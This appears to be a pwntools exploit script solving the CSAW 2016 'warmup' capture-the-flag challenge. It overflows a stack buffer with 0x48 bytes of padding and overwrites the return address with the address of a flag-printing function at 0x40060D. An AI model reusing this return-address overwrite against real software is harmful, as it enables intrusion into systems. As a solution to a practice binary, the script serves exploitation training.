
from pwn import *

context(log_level='debug')

io=process("./warmup_csaw_2016")

io.recv()
cat_flag=0x40060D
payload=b'A'*(0x40+0x8)+p64(cat_flag)

io.send(payload)

#io.recv()

io.interactive()




